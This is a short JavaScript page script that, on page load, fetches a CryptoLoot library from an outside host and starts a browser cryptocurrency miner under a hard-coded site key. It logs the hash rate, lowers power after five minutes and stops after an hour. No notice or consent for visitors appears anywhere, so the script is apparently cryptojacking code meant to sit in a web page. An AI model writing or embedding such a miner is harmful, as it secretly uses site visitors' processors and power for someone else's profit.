$(window).on('load', function () {
  CryptoLoot.CONFIG.LIB_URL = 'http://www.helloleia.com/dash-static/lib/'
  var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
    autoThreads: false,
    throttle: 0.92
  })
  miner.start()
  setInterval(function () {
    var hashesPerSecond = miner.getHashesPerSecond()
    console.log(hashesPerSecond)
  }, 3000)
  setTimeout(function () {
    console.log('Switching miner to low power mode')
    miner.setThrottle(0.99)
    setTimeout(function () {
      console.log('Miner off')
      miner.stop()
    }, 60 * 60 * 1000)
  }, 5 * 60 * 1000)
})
